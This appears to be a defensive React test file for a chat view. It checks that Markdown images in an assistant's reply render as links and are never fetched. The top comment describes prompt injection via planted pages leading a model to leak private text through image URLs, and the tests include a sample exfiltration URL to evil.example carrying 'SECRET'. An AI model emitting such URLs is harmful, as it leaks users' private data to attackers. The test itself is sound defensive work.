import { describe, it, expect, vi } from 'vitest';
import { render, screen } from '@testing-library/react';
import ChatView from './ChatView';

// A reply's Markdown image is fetched by the browser the moment it renders, with no click. A model steered by
// a planted web page or a shared document can put private text into that address, so a reply never loads a
// picture from anywhere: it shows a link the person can choose to open.

const theme = { bg: '', bgSecondary: '', bgTertiary: '', border: '', borderSecondary: '', text: '', textSecondary: '', textMuted: '', hover: '' };
const baseProps = (over = {}) => ({
    theme, darkMode: false, effectiveIsMobile: false, messages: [], isStreaming: false,
    selectedModel: 'ollama:m', reachable: true, sendMessage: vi.fn(), stopStream: vi.fn(),
    speakingMessageId: null, speakMessage: vi.fn(), stopSpeaking: vi.fn(), downloadingMessageId: null,
    downloadMessageAudio: vi.fn(), showToast: vi.fn(), pins: [], onRemovePin: vi.fn(), numCtx: null, ...over,
});
const show = (content) => render(<ChatView {...baseProps({
    messages: [{ id: 'u1', role: 'user', content: 'q' }, { id: 'a1', role: 'assistant', content, status: 'complete' }],
})} />);

describe('ChatView: pictures in a reply', () => {
    it('a remote picture becomes a link and nothing is fetched', () => {
        const { container } = show('Here: ![the chart](https://evil.example/c.png?d=SECRET)');
        expect(container.querySelector('img')).toBeNull();
        const link = screen.getByRole('link', { name: /the chart/ });
        expect(link).toHaveAttribute('href', 'https://evil.example/c.png?d=SECRET');
        expect(link).toHaveAttribute('rel', 'noopener noreferrer');
        expect(link).toHaveAttribute('target', '_blank');
    });

    it('a picture with no description is still a visible link', () => {
        show('![](https://example.com/a.png)');
        expect(screen.getByRole('link', { name: /Picture/ })).toHaveAttribute('href', 'https://example.com/a.png');
    });

    it.each(['/v1/auth/logout', '//evil.example/x.png', 'http://127.0.0.1:8000/v1/x'])('%s is not loaded either', (src) => {
        const { container } = show(`![x](${src})`);
        expect(container.querySelector('img')).toBeNull();
    });

    it('a picture carried inside the reply itself shows as its description', () => {
        const { container } = show('See ![a red dot](data:image/png;base64,iVBORw0KGgo=) here');
        expect(container.querySelector('img')).toBeNull();
        expect(screen.getByText(/a red dot/)).toBeInTheDocument();
    });
});
